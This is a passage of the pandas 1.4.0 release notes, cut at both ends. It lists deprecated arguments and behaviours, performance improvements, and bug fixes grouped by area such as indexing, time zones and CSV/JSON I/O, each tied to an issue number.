:meth:`Index.is_type_compatible` (:issue:`42113`)\n- Deprecated ``method`` argument in :meth:`Index.get_loc`, use ``index.get_indexer([label], method=...)`` instead (:issue:`42269`)\n- Deprecated treating integer keys in :meth:`Series.__setitem__` as positional when the index is a :class:`Float64Index` not containing the key, a :class:`IntervalIndex` with no entries containing the key, or a :class:`MultiIndex` with leading :class:`Float64Index` level not containing the key (:issue:`33469`)\n- Deprecated treating ``numpy.datetime64`` objects as UTC times when passed to the :class:`Timestamp` constructor along with a timezone. In a future version, these will be treated as wall-times. To retain the old behavior, use ``Timestamp(dt64).tz_localize(\"UTC\").tz_convert(tz)`` (:issue:`24559`)\n- Deprecated ignoring missing labels when indexing with a sequence of labels on a level of a :class:`MultiIndex` (:issue:`42351`)\n- Creating an empty :class:`Series` without a ``dtype`` will now raise a more visible ``FutureWarning`` instead of a ``DeprecationWarning`` (:issue:`30017`)\n- Deprecated the ``kind`` argument in :meth:`Index.get_slice_bound`, :meth:`Index.slice_indexer`, and :meth:`Index.slice_locs`; in a future version passing ``kind`` will raise (:issue:`42857`)\n- Deprecated dropping of nuisance columns in :class:`Rolling`, :class:`Expanding`, and :class:`EWM` aggregations (:issue:`42738`)\n- Deprecated :meth:`Index.reindex` with a non-unique :class:`Index` (:issue:`42568`)\n- Deprecated :meth:`.Styler.render` in favor of :meth:`.Styler.to_html` (:issue:`42140`)\n- Deprecated :meth:`.Styler.hide_index` and :meth:`.Styler.hide_columns` in favor of :meth:`.Styler.hide` (:issue:`43758`)\n- Deprecated passing in a string column label into ``times`` in :meth:`DataFrame.ewm` (:issue:`43265`)\n- Deprecated the ``include_start`` and ``include_end`` arguments in :meth:`DataFrame.between_time`; in a future version passing ``include_start`` or ``include_end`` will raise (:issue:`40245`)\n- Deprecated the ``squeeze`` argument to :meth:`read_csv`, :meth:`read_table`, and :meth:`read_excel`. Users should squeeze the :class:`DataFrame` afterwards with ``.squeeze(\"columns\")`` instead (:issue:`43242`)\n- Deprecated the ``index`` argument to :class:`SparseArray` construction (:issue:`23089`)\n- Deprecated the ``closed`` argument in :meth:`date_range` and :meth:`bdate_range` in favor of ``inclusive`` argument; In a future version passing ``closed`` will raise (:issue:`40245`)\n- Deprecated :meth:`.Rolling.validate`, :meth:`.Expanding.validate`, and :meth:`.ExponentialMovingWindow.validate` (:issue:`43665`)\n- Deprecated silent dropping of columns that raised a ``TypeError`` in :class:`Series.transform` and :class:`DataFrame.transform` when used with a dictionary (:issue:`43740`)\n- Deprecated silent dropping of columns that raised a ``TypeError``, ``DataError``, and some cases of ``ValueError`` in :meth:`Series.aggregate`, :meth:`DataFrame.aggregate`, :meth:`Series.groupby.aggregate`, and :meth:`DataFrame.groupby.aggregate` when used with a list (:issue:`43740`)\n- Deprecated casting behavior when setting timezone-aware value(s) into a timezone-aware :class:`Series` or :class:`DataFrame` column when the timezones do not match. Previously this cast to object dtype. In a future version, the values being inserted will be converted to the series or column's existing timezone (:issue:`37605`)\n- Deprecated casting behavior when passing an item with mismatched-timezone to :meth:`DatetimeIndex.insert`, :meth:`DatetimeIndex.putmask`, :meth:`DatetimeIndex.where` :meth:`DatetimeIndex.fillna`, :meth:`Series.mask`, :meth:`Series.where`, :meth:`Series.fillna`, :meth:`Series.shift`, :meth:`Series.replace`, :meth:`Series.reindex` (and :class:`DataFrame` column analogues). In the past this has cast to object ``dtype``. In a future version, these will cast the passed item to the index or series's timezone (:issue:`37605`, :issue:`44940`)\n- Deprecated the ``prefix`` keyword argument in :func:`read_csv` and :func:`read_table`, in a future version the argument will be removed (:issue:`43396`)\n- Deprecated passing non boolean argument to ``sort`` in :func:`concat` (:issue:`41518`)\n- Deprecated passing arguments as positional for :func:`read_fwf` other than ``filepath_or_buffer`` (:issue:`41485`)\n- Deprecated passing arguments as positional for :func:`read_xml` other than ``path_or_buffer`` (:issue:`45133`)\n- Deprecated passing ``skipna=None`` for :meth:`DataFrame.mad` and :meth:`Series.mad`, pass ``skipna=True`` instead (:issue:`44580`)\n- Deprecated the behavior of :func:`to_datetime` with the string \"now\" with ``utc=False``; in a future version this will match ``Timestamp(\"now\")``, which in turn matches :meth:`Timestamp.now` returning the local time (:issue:`18705`)\n- Deprecated :meth:`DateOffset.apply`, use ``offset + other`` instead (:issue:`44522`)\n- Deprecated parameter ``names`` in :meth:`Index.copy` (:issue:`44916`)\n- A deprecation warning is now shown for :meth:`DataFrame.to_latex` indicating the arguments signature may change and emulate more the arguments to :meth:`.Styler.to_latex` in future versions (:issue:`44411`)\n- Deprecated behavior of :func:`concat` between objects with bool-dtype and numeric-dtypes; in a future version these will cast to object dtype instead of coercing bools to numeric values (:issue:`39817`)\n- Deprecated :meth:`Categorical.replace`, use :meth:`Series.replace` instead (:issue:`44929`)\n- Deprecated passing ``set`` or ``dict`` as indexer for :meth:`DataFrame.loc.__setitem__`, :meth:`DataFrame.loc.__getitem__`, :meth:`Series.loc.__setitem__`, :meth:`Series.loc.__getitem__`, :meth:`DataFrame.__getitem__`, :meth:`Series.__getitem__` and :meth:`Series.__setitem__` (:issue:`42825`)\n- Deprecated :meth:`Index.__getitem__` with a bool key; use ``index.values[key]`` to get the old behavior (:issue:`44051`)\n- Deprecated downcasting column-by-column in :meth:`DataFrame.where` with integer-dtypes (:issue:`44597`)\n- Deprecated :meth:`DatetimeIndex.union_many`, use :meth:`DatetimeIndex.union` instead (:issue:`44091`)\n- Deprecated :meth:`.Groupby.pad` in favor of :meth:`.Groupby.ffill` (:issue:`33396`)\n- Deprecated :meth:`.Groupby.backfill` in favor of :meth:`.Groupby.bfill` (:issue:`33396`)\n- Deprecated :meth:`.Resample.pad` in favor of :meth:`.Resample.ffill` (:issue:`33396`)\n- Deprecated :meth:`.Resample.backfill` in favor of :meth:`.Resample.bfill` (:issue:`33396`)\n- Deprecated ``numeric_only=None`` in :meth:`DataFrame.rank`; in a future version ``numeric_only`` must be either ``True`` or ``False`` (the default) (:issue:`45036`)\n- Deprecated the behavior of :meth:`Timestamp.utcfromtimestamp`, in the future it will return a timezone-aware UTC :class:`Timestamp` (:issue:`22451`)\n- Deprecated :meth:`NaT.freq` (:issue:`45071`)\n- Deprecated behavior of :class:`Series` and :class:`DataFrame` construction when passed float-dtype data containing ``NaN`` and an integer dtype ignoring the dtype argument; in a future version this will raise (:issue:`40110`)\n- Deprecated the behaviour of :meth:`Series.to_frame` and :meth:`Index.to_frame` to ignore the ``name`` argument when ``name=None``. Currently, this means to preserve the existing name, but in the future explicitly passing ``name=None`` will set ``None`` as the name of the column in the resulting DataFrame (:issue:`44212`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n- Performance improvement in :meth:`.DataFrameGroupBy.sample` and :meth:`.SeriesGroupBy.sample`, especially when ``weights`` argument provided (:issue:`34483`)\n- Performance improvement when converting non-string arrays to string arrays (:issue:`34483`)\n- Performance improvement in :meth:`.DataFrameGroupBy.transform` and :meth:`.SeriesGroupBy.transform` for user-defined functions (:issue:`41598`)\n- Performance improvement in constructing :class:`DataFrame` objects (:issue:`42631`, :issue:`43142`, :issue:`43147`, :issue:`43307`, :issue:`43144`, :issue:`44826`)\n- Performance improvement in :meth:`.DataFrameGroupBy.shift` and :meth:`.SeriesGroupBy.shift` when ``fill_value`` argument is provided (:issue:`26615`)\n- Performance improvement in :meth:`DataFrame.corr` for ``method=pearson`` on data without missing values (:issue:`40956`)\n- Performance improvement in some :meth:`.DataFrameGroupBy.apply` and :meth:`.SeriesGroupBy.apply` operations (:issue:`42992`, :issue:`43578`)\n- Performance improvement in :func:`read_stata` (:issue:`43059`, :issue:`43227`)\n- Performance improvement in :func:`read_sas` (:issue:`43333`)\n- Performance improvement in :meth:`to_datetime` with ``uint`` dtypes (:issue:`42606`)\n- Performance improvement in :meth:`to_datetime` with ``infer_datetime_format`` set to ``True`` (:issue:`43901`)\n- Performance improvement in :meth:`Series.sparse.to_coo` (:issue:`42880`)\n- Performance improvement in indexing with a :class:`UInt64Index` (:issue:`43862`)\n- Performance improvement in indexing with a :class:`Float64Index` (:issue:`43705`)\n- Performance improvement in indexing with a non-unique :class:`Index` (:issue:`43792`)\n- Performance improvement in indexing with a listlike indexer on a :class:`MultiIndex` (:issue:`43370`)\n- Performance improvement in indexing with a :class:`MultiIndex` indexer on another :class:`MultiIndex` (:issue:`43370`)\n- Performance improvement in :meth:`.DataFrameGroupBy.quantile` and :meth:`.SeriesGroupBy.quantile` (:issue:`43469`, :issue:`43725`)\n- Performance improvement in :meth:`.DataFrameGroupBy.count` and :meth:`.SeriesGroupBy.count` (:issue:`43730`, :issue:`43694`)\n- Performance improvement in :meth:`.DataFrameGroupBy.any`, :meth:`.SeriesGroupBy.any`, :meth:`.DataFrameGroupBy.all`, and :meth:`.SeriesGroupBy.all` (:issue:`43675`, :issue:`42841`)\n- Performance improvement in :meth:`.DataFrameGroupBy.std` and :meth:`.SeriesGroupBy.std` (:issue:`43115`, :issue:`43576`)\n- Performance improvement in :meth:`.DataFrameGroupBy.cumsum` and :meth:`.SeriesGroupBy.cumsum` (:issue:`43309`)\n- :meth:`SparseArray.min` and :meth:`SparseArray.max` no longer require converting to a dense array (:issue:`43526`)\n- Indexing into a :class:`SparseArray` with a ``slice`` with ``step=1`` no longer requires converting to a dense array (:issue:`43777`)\n- Performance improvement in :meth:`SparseArray.take` with ``allow_fill=False`` (:issue:`43654`)\n- Performance improvement in :meth:`.Rolling.mean`, :meth:`.Expanding.mean`, :meth:`.Rolling.sum`, :meth:`.Expanding.sum`, :meth:`.Rolling.max`, :meth:`.Expanding.max`, :meth:`.Rolling.min` and :meth:`.Expanding.min` with ``engine=\"numba\"`` (:issue:`43612`, :issue:`44176`, :issue:`45170`)\n- Improved performance of :meth:`pandas.read_csv` with ``memory_map=True`` when file encoding is UTF-8 (:issue:`43787`)\n- Performance improvement in :meth:`RangeIndex.sort_values` overriding :meth:`Index.sort_values` (:issue:`43666`)\n- Performance improvement in :meth:`RangeIndex.insert` (:issue:`43988`)\n- Performance improvement in :meth:`Index.insert` (:issue:`43953`)\n- Performance improvement in :meth:`DatetimeIndex.tolist` (:issue:`43823`)\n- Performance improvement in :meth:`DatetimeIndex.union` (:issue:`42353`)\n- Performance improvement in :meth:`Series.nsmallest` (:issue:`43696`)\n- Performance improvement in :meth:`DataFrame.insert` (:issue:`42998`)\n- Performance improvement in :meth:`DataFrame.dropna` (:issue:`43683`)\n- Performance improvement in :meth:`DataFrame.fillna` (:issue:`43316`)\n- Performance improvement in :meth:`DataFrame.values` (:issue:`43160`)\n- Performance improvement in :meth:`DataFrame.select_dtypes` (:issue:`42611`)\n- Performance improvement in :class:`DataFrame` reductions (:issue:`43185`, :issue:`43243`, :issue:`43311`, :issue:`43609`)\n- Performance improvement in :meth:`Series.unstack` and :meth:`DataFrame.unstack` (:issue:`43335`, :issue:`43352`, :issue:`42704`, :issue:`43025`)\n- Performance improvement in :meth:`Series.to_frame` (:issue:`43558`)\n- Performance improvement in :meth:`Series.mad` (:issue:`43010`)\n- Performance improvement in :func:`merge` (:issue:`43332`)\n- Performance improvement in :func:`to_csv` when index column is a datetime and is formatted (:issue:`39413`)\n- Performance improvement in :func:`to_csv` when :class:`MultiIndex` contains a lot of unused levels (:issue:`37484`)\n- Performance improvement in :func:`read_csv` when ``index_col`` was set with a numeric column (:issue:`44158`)\n- Performance improvement in :func:`concat` (:issue:`43354`)\n- Performance improvement in :meth:`SparseArray.__getitem__` (:issue:`23122`)\n- Performance improvement in constructing a :class:`DataFrame` from array-like objects like a ``Pytorch`` tensor (:issue:`44616`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_140.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\nCategorical\n^^^^^^^^^^^\n- Bug in setting dtype-incompatible values into a :class:`Categorical` (or ``Series`` or ``DataFrame`` backed by ``Categorical``) raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.searchsorted` when passing a dtype-incompatible value raising ``KeyError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.astype` casting datetimes and :class:`Timestamp` to int for dtype ``object`` (:issue:`44930`)\n- Bug in :meth:`Series.where` with ``CategoricalDtype`` when passing a dtype-incompatible value raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.fillna` when passing a dtype-incompatible value raising ``ValueError`` instead of ``TypeError`` (:issue:`41919`)\n- Bug in :meth:`Categorical.fillna` with a tuple-like category raising ``ValueError`` instead of ``TypeError`` when filling with a non-category tuple (:issue:`41919`)\n\nDatetimelike\n^^^^^^^^^^^^\n- Bug in :class:`DataFrame` constructor unnecessarily copying non-datetimelike 2D object arrays (:issue:`39272`)\n- Bug in :func:`to_datetime` with ``format`` and ``pandas.NA`` was raising ``ValueError`` (:issue:`42957`)\n- :func:`to_datetime` would silently swap ``MM/DD/YYYY`` and ``DD/MM/YYYY`` formats if the given ``dayfirst`` option could not be respected - now, a warning is raised in the case of delimited date strings (e.g. ``31-12-2012``) (:issue:`12585`)\n- Bug in :meth:`date_range` and :meth:`bdate_range` do not return right bound when ``start`` = ``end`` and set is closed on one side (:issue:`43394`)\n- Bug in inplace addition and subtraction of :class:`DatetimeIndex` or :class:`TimedeltaIndex` with :class:`DatetimeArray` or :class:`TimedeltaArray` (:issue:`43904`)\n- Bug in calling ``np.isnan``, ``np.isfinite``, or ``np.isinf`` on a timezone-aware :class:`DatetimeIndex` incorrectly raising ``TypeError`` (:issue:`43917`)\n- Bug in constructing a :class:`Series` from datetime-like strings with mixed timezones incorrectly partially-inferring datetime values (:issue:`40111`)\n- Bug in addition of a :class:`Tick` object and a ``np.timedelta64`` object incorrectly raising instead of returning :class:`Timedelta` (:issue:`44474`)\n- ``np.maximum.reduce`` and ``np.minimum.reduce`` now correctly return :class:`Timestamp` and :class:`Timedelta` objects when operating on :class:`Series`, :class:`DataFrame`, or :class:`Index` with ``datetime64[ns]`` or ``timedelta64[ns]`` dtype (:issue:`43923`)\n- Bug in adding a ``np.timedelta64`` object to a :class:`BusinessDay` or :class:`CustomBusinessDay` object incorrectly raising (:issue:`44532`)\n- Bug in :meth:`Index.insert` for inserting ``np.datetime64``, ``np.timedelta64`` or ``tuple`` into :class:`Index` with ``dtype='object'`` with negative loc adding ``None`` and replacing existing value (:issue:`44509`)\n- Bug in :meth:`Timestamp.to_pydatetime` failing to retain the ``fold`` attribute (:issue:`45087`)\n- Bug in :meth:`Series.mode` with ``DatetimeTZDtype`` incorrectly returning timezone-naive and ``PeriodDtype`` incorrectly raising (:issue:`41927`)\n- Fixed regression in :meth:`~Series.reindex` raising an error when using an incompatible fill value with a datetime-like dtype (or not raising a deprecation warning for using a ``datetime.date`` as fill value) (:issue:`42921`)\n- Bug in :class:`DateOffset` addition with :class:`Timestamp` where ``offset.nanoseconds`` would not be included in the result (:issue:`43968`, :issue:`36589`)\n- Bug in :meth:`Timestamp.fromtimestamp` not supporting the ``tz`` argument (:issue:`45083`)\n- Bug in :class:`DataFrame` construction from dict of :class:`Series` with mismatched index dtypes sometimes raising depending on the ordering of the passed dict (:issue:`44091`)\n- Bug in :class:`Timestamp` hashing during some DST transitions caused a segmentation fault (:issue:`33931` and :issue:`40817`)\n\nTimedelta\n^^^^^^^^^\n- Bug in division of all-``NaT`` :class:`TimeDeltaIndex`, :class:`Series` or :class:`DataFrame` column with object-dtype array like of numbers failing to infer the result as timedelta64-dtype (:issue:`39750`)\n- Bug in floor division of ``timedelta64[ns]`` data with a scalar returning garbage values (:issue:`44466`)\n- Bug in :class:`Timedelta` now properly taking into account any nanoseconds contribution of any kwarg (:issue:`43764`, :issue:`45227`)\n\nTime Zones\n^^^^^^^^^^\n- Bug in :func:`to_datetime` with ``infer_datetime_format=True`` failing to parse zero UTC offset (``Z``) correctly (:issue:`41047`)\n- Bug in :meth:`Series.dt.tz_convert` resetting index in a :class:`Series` with :class:`CategoricalIndex` (:issue:`43080`)\n- Bug in ``Timestamp`` and ``DatetimeIndex`` incorrectly raising a ``TypeError`` when subtracting two timezone-aware objects with mismatched timezones (:issue:`31793`)\n\nNumeric\n^^^^^^^\n- Bug in floor-dividing a list or tuple of integers by a :class:`Series` incorrectly raising (:issue:`44674`)\n- Bug in :meth:`DataFrame.rank` raising ``ValueError`` with ``object`` columns and ``method=\"first\"`` (:issue:`41931`)\n- Bug in :meth:`DataFrame.rank` treating missing values and extreme values as equal (for example ``np.nan`` and ``np.inf``), causing incorrect results when ``na_option=\"bottom\"`` or ``na_option=\"top`` used (:issue:`41931`)\n- Bug in ``numexpr`` engine still being used when the option ``compute.use_numexpr`` is set to ``False`` (:issue:`32556`)\n- Bug in :class:`DataFrame` arithmetic ops with a subclass whose :meth:`_constructor` attribute is a callable other than the subclass itself (:issue:`43201`)\n- Bug in arithmetic operations involving :class:`RangeIndex` where the result would have the incorrect ``name`` (:issue:`43962`)\n- Bug in arithmetic operations involving :class:`Series` where the result could have the incorrect ``name`` when the operands having matching NA or matching tuple names (:issue:`44459`)\n- Bug in division with ``IntegerDtype`` or ``BooleanDtype`` array and NA scalar incorrectly raising (:issue:`44685`)\n- Bug in multiplying a :class:`Series` with ``FloatingDtype`` with a timedelta-like scalar incorrectly raising (:issue:`44772`)\n\nConversion\n^^^^^^^^^^\n- Bug in :class:`UInt64Index` constructor when passing a list containing both positive integers small enough to cast to int64 and integers too large to hold in int64 (:issue:`42201`)\n- Bug in :class:`Series` constructor returning 0 for missing values with dtype ``int64`` and ``False`` for dtype ``bool`` (:issue:`43017`, :issue:`43018`)\n- Bug in constructing a :class:`DataFrame` from a :class:`PandasArray` containing :class:`Series` objects behaving differently than an equivalent ``np.ndarray`` (:issue:`43986`)\n- Bug in :class:`IntegerDtype` not allowing coercion from string dtype (:issue:`25472`)\n- Bug in :func:`to_datetime` with ``arg:xr.DataArray`` and ``unit=\"ns\"`` specified raises ``TypeError`` (:issue:`44053`)\n- Bug in :meth:`DataFrame.convert_dtypes` not returning the correct type when a subclass does not overload :meth:`_constructor_sliced` (:issue:`43201`)\n- Bug in :meth:`DataFrame.astype` not propagating ``attrs`` from the original :class:`DataFrame` (:issue:`44414`)\n- Bug in :meth:`DataFrame.convert_dtypes` result losing ``columns.names`` (:issue:`41435`)\n- Bug in constructing a ``IntegerArray`` from pyarrow data failing to validate dtypes (:issue:`44891`)\n- Bug in :meth:`Series.astype` not allowing converting from a ``PeriodDtype`` to ``datetime64`` dtype, inconsistent with the :class:`PeriodIndex` behavior (:issue:`45038`)\n\nStrings\n^^^^^^^\n- Bug in checking for ``string[pyarrow]`` dtype incorrectly raising an ``ImportError`` when pyarrow is not installed (:issue:`44276`)\n\nInterval\n^^^^^^^^\n- Bug in :meth:`Series.where` with ``IntervalDtype`` incorrectly raising when the ``where`` call should not replace anything (:issue:`44181`)\n\nIndexing\n^^^^^^^^\n- Bug in :meth:`Series.rename` with :class:`MultiIndex` and ``level`` is provided (:issue:`43659`)\n- Bug in :meth:`DataFrame.truncate` and :meth:`Series.truncate` when the object's :class:`Index` has a length greater than one but only one unique value (:issue:`42365`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` with a :class:`MultiIndex` when indexing with a tuple in which one of the levels is also a tuple (:issue:`27591`)\n- Bug in :meth:`Series.loc` with a :class:`MultiIndex` whose first level contains only ``np.nan`` values (:issue:`42055`)\n- Bug in indexing on a :class:`Series` or :class:`DataFrame` with a :class:`DatetimeIndex` when passing a string, the return type depended on whether the index was monotonic (:issue:`24892`)\n- Bug in indexing on a :class:`MultiIndex` failing to drop scalar levels when the indexer is a tuple containing a datetime-like string (:issue:`42476`)\n- Bug in :meth:`DataFrame.sort_values` and :meth:`Series.sort_values` when passing an ascending value, failed to raise or incorrectly raising ``ValueError`` (:issue:`41634`)\n- Bug in updating values of :class:`pandas.Series` using boolean index, created by using :meth:`pandas.DataFrame.pop` (:issue:`42530`)\n- Bug in :meth:`Index.get_indexer_non_unique` when index contains multiple ``np.nan`` (:issue:`35392`)\n- Bug in :meth:`DataFrame.query` did not handle the degree sign in a backticked column name, such as \\`Temp(\u00c2\u00b0C)\\`, used in an expression to query a :class:`DataFrame` (:issue:`42826`)\n- Bug in :meth:`DataFrame.drop` where the error message did not show missing labels with commas when raising ``KeyError`` (:issue:`42881`)\n- Bug in :meth:`DataFrame.query` where method calls in query strings led to errors when the ``numexpr`` package was installed (:issue:`22435`)\n- Bug in :meth:`DataFrame.nlargest` and :meth:`Series.nlargest` where sorted result did not count indexes containing ``np.nan`` (:issue:`28984`)\n- Bug in indexing on a non-unique object-dtype :class:`Index` with an NA scalar (e.g. ``np.nan``) (:issue:`43711`)\n- Bug in :meth:`DataFrame.__setitem__` incorrectly writing into an existing column's array rather than setting a new array when the new dtype and the old dtype match (:issue:`43406`)\n- Bug in setting floating-dtype values into a :class:`Series` with integer dtype failing to set inplace when those values can be losslessly converted to integers (:issue:`44316`)\n- Bug in :meth:`Series.__setitem__` with object dtype when setting an array with matching size and dtype='datetime64[ns]' or dtype='timedelta64[ns]' incorrectly converting the datetime/timedeltas to integers (:issue:`43868`)\n- Bug in :meth:`DataFrame.sort_index` where ``ignore_index=True`` was not being respected when the index was already sorted (:issue:`43591`)\n- Bug in :meth:`Index.get_indexer_non_unique` when index contains multiple ``np.datetime64(\"NaT\")`` and ``np.timedelta64(\"NaT\")`` (:issue:`43869`)\n- Bug in setting a scalar :class:`Interval` value into a :class:`Series` with ``IntervalDtype`` when the scalar's sides are floats and the values' sides are integers (:issue:`44201`)\n- Bug when setting string-backed :class:`Categorical` values that can be parsed to datetimes into a :class:`DatetimeArray` or :class:`Series` or :class:`DataFrame` column backed by :class:`DatetimeArray` failing to parse these strings (:issue:`44236`)\n- Bug in :meth:`Series.__setitem__` with an integer dtype other than ``int64`` setting with a ``range`` object unnecessarily upcasting to ``int64`` (:issue:`44261`)\n- Bug in :meth:`Series.__setitem__` with a boolean mask indexer setting a listlike value of length 1 incorrectly broadcasting that value (:issue:`44265`)\n- Bug in :meth:`Series.reset_index` not ignoring ``name`` argument when ``drop`` and ``inplace`` are set to ``True`` (:issue:`44575`)\n- Bug in :meth:`DataFrame.loc.__setitem__` and :meth:`DataFrame.iloc.__setitem__` with mixed dtypes sometimes failing to operate in-place (:issue:`44345`)\n- Bug in :meth:`DataFrame.loc.__getitem__` incorrectly raising ``KeyError`` when selecting a single column with a boolean key (:issue:`44322`).\n- Bug in setting :meth:`DataFrame.iloc` with a single ``ExtensionDtype`` column and setting 2D values e.g. ``df.iloc[:] = df.values`` incorrectly raising (:issue:`44514`)\n- Bug in setting values with :meth:`DataFrame.iloc` with a single ``ExtensionDtype`` column and a tuple of arrays as the indexer (:issue:`44703`)\n- Bug in indexing on columns with ``loc`` or ``iloc`` using a slice with a negative step with ``ExtensionDtype`` columns incorrectly raising (:issue:`44551`)\n- Bug in :meth:`DataFrame.loc.__setitem__` changing dtype when indexer was completely ``False`` (:issue:`37550`)\n- Bug in :meth:`IntervalIndex.get_indexer_non_unique` returning boolean mask instead of array of integers for a non unique and non monotonic index (:issue:`44084`)\n- Bug in :meth:`IntervalIndex.get_indexer_non_unique` not handling targets of ``dtype`` 'object' with NaNs correctly (:issue:`44482`)\n- Fixed regression where a single column ``np.matrix`` was no longer coerced to a 1d ``np.ndarray`` when added to a :class:`DataFrame` (:issue:`42376`)\n- Bug in :meth:`Series.__getitem__` with a :class:`CategoricalIndex` of integers treating lists of integers as positional indexers, inconsistent with the behavior with a single scalar integer (:issue:`15470`, :issue:`14865`)\n- Bug in :meth:`Series.__setitem__` when setting floats or integers into integer-dtype :class:`Series` failing to upcast when necessary to retain precision (:issue:`45121`)\n- Bug in :meth:`DataFrame.iloc.__setitem__` ignores axis argument (:issue:`45032`)\n\nMissing\n^^^^^^^\n- Bug in :meth:`DataFrame.fillna` with ``limit`` and no ``method`` ignores ``axis='columns'`` or ``axis = 1`` (:issue:`40989`, :issue:`17399`)\n- Bug in :meth:`DataFrame.fillna` not replacing missing values when using a dict-like ``value`` and duplicate column names (:issue:`43476`)\n- Bug in constructing a :class:`DataFrame` with a dictionary ``np.datetime64`` as a value and ``dtype='timedelta64[ns]'``, or vice-versa, incorrectly casting instead of raising (:issue:`44428`)\n- Bug in :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` with ``inplace=True`` not writing to the underlying array(s) in-place (:issue:`44749`)\n- Bug in :meth:`Index.fillna` incorrectly returning an unfilled :class:`Index` when NA values are present and ``downcast`` argument is specified. This now raises ``NotImplementedError`` instead; do not pass ``downcast`` argument (:issue:`44873`)\n- Bug in :meth:`DataFrame.dropna` changing :class:`Index` even if no entries were dropped (:issue:`41965`)\n- Bug in :meth:`Series.fillna` with an object-dtype incorrectly ignoring ``downcast=\"infer\"`` (:issue:`44241`)\n\nMultiIndex\n^^^^^^^^^^\n- Bug in :meth:`MultiIndex.get_loc` where the first level is a :class:`DatetimeIndex` and a string key is passed (:issue:`42465`)\n- Bug in :meth:`MultiIndex.reindex` when passing a ``level`` that corresponds to an ``ExtensionDtype`` level (:issue:`42043`)\n- Bug in :meth:`MultiIndex.get_loc` raising ``TypeError`` instead of ``KeyError`` on nested tuple (:issue:`42440`)\n- Bug in :meth:`MultiIndex.union` setting wrong ``sortorder`` causing errors in subsequent indexing operations with slices (:issue:`44752`)\n- Bug in :meth:`MultiIndex.putmask` where the other value was also a :class:`MultiIndex` (:issue:`43212`)\n- Bug in :meth:`MultiIndex.dtypes` duplicate level names returned only one dtype per name (:issue:`45174`)\n\nI/O\n^^^\n- Bug in :func:`read_excel` attempting to read chart sheets from .xlsx files (:issue:`41448`)\n- Bug in :func:`json_normalize` where ``errors=ignore`` could fail to ignore missing values of ``meta`` when ``record_path`` has a length greater than one (:issue:`41876`)\n- Bug in :func:`read_csv` with multi-header input and arguments referencing column names as tuples (:issue:`42446`)\n- Bug in :func:`read_fwf`, where difference in lengths of ``colspecs`` and ``names`` was not raising ``ValueError`` (:issue:`40830`)\n- Bug in :func:`Series.to_json` and :func:`DataFrame.to_json` where some attributes were skipped when serializing plain Python objects to JSON (:issue:`42768`, :issue:`33043`)\n- Column headers are dropped when constructing a :class:`DataFrame` from a sqlalchemy's ``Row`` object (:issue:`40682`)\n- Bug in unpickling an :class:`Index` with object dtype incorrectly inferring numeric dtypes (:issue:`43188`)\n- Bug in :func:`read_csv` where reading multi-header input with unequal lengths incorrectly raised ``IndexError`` (:issue:`43102`)\n- Bug in :func:`read_csv` raising ``ParserError`` when reading file in chunks and some chunk blocks have fewer columns than header for ``engine=\"c\"`` (:issue:`21211`)\n- Bug in :func:`read_csv`, changed exception class when expecting a file path name or file-like object from ``OSError`` to ``TypeError`` (:issue:`43366`)\n- Bug in :func:`read_csv` and :func:`read_fwf` ignoring all ``skiprows`` except first when ``nrows`` is specified for ``engine='python'`` (:issue:`44021`, :issue:`10261`)\n- Bug in :func:`read_csv` keeping the original column in object format when ``keep_date_col=True`` is set (:issue:`13378`)\n- Bug in :func:`read_json` not handling non-numpy dtypes correctly (especially ``category``) (:issue:`21892`, :issue:`33205`)\n- Bug in :func:`json_normalize` where multi-character ``sep`` parameter is incorrectly prefixed to every key (:issue:`43831`)\n- Bug in :func:`json_normalize` where reading data with missing multi-level metadata would not respect ``errors=\"ignore\"`` (:issue:`44312`)\n- Bug in :func:`read_csv` used second row to guess implicit index if ``header`` was set to ``None`` for ``engine=\"python\"`` (:issue:`22144`)\n- Bug in :func:`read_csv` not recognizing bad lines when ``names`` were given for ``engine=\"c\"`` (:issue:`22144`)\n- Bug in :func:`read_csv` with :code:`float_precision=\"round_trip\"` which did not skip initial/trailing whitespace (:issue:`43713`)\n- Bug when Python is built without the lzma module: a warning was raised at the pandas import time, even if the lzma capability isn't used (:issue:`43495`)\n- Bug in :func:`read_csv` not applying dtype for ``index_col`` (:issue:`9435`)\n- Bug in dumping/loading a :class:`DataFrame` with ``yaml.dump(frame)`` (:issue:`42748`)\n- Bug in :func:`read_csv` raising ``ValueError`` when ``names`` was longer than ``header`` but equal to data rows for ``engine=\"python\"`` (:issue:`38453`)\n- Bug in :class:`ExcelWriter`, where ``engine_kwargs`` were not passed through to all engines (:issue:`43442`)\n- Bug in :func:`read_csv` raising ``ValueError`` when ``parse_dates`` was used with :class:`MultiIndex` columns (:issue:`8991`)\n- Bug in :func:`read_csv` not raising an ``ValueError`` when ``\\n`` was specified as ``delimiter`` or ``sep`` which conflicts with ``lineterminator`` (:issue:`43528`)\n- Bug in :func:`to_csv` converting datetimes in categorical :class:`Series` to integers (:issue:`40754`)\n- Bug in :func:`read_csv` converting columns to numeric after date parsing failed (:issue:`11019`)\n- Bug in :func:`read_csv` not replacing ``NaN`` values with ``np.nan`` before attempting date conversion (:issue:`26203`)\n- Bug in :func:`read_csv` raising ``AttributeError`` when attempting to read a .csv file and infer index column dtype from an nullable integer type (:issue:`44079`)\n- Bug in :func:`to_csv` always coercing datetime columns with different formats to the same format (:issue:`21734`)\n- :meth:`DataFrame.to_csv` and :meth:`Series.to_csv` with ``compression`` set to ``'zip'`` no longer create a zip file containing a file ending with \".zip\". Instead, they try to infer the inner file name more smartly (:issue:`39465`)\n- Bug in :func:`read_csv` where reading a mixed column of booleans and missing values to a float type results in the missing values becoming 1.0 rather than NaN (:issue:`42808`, :issue:`34120`)\n- Bug in :func:`to_xml` raising error for ``pd.NA`` with extension array dtype (:issue:`43903`)\n- Bug in :func:`read_csv` when passing simultaneously a parser in ``date_parser`` and ``parse_dates=False``, the parsing was still called (:issue:`44366`)\n- Bug in :func:`read_csv` not setting name of :class:`MultiIndex` columns correctly when ``index_col`` is not the first column (:issue:`38549`)\n- Bug in 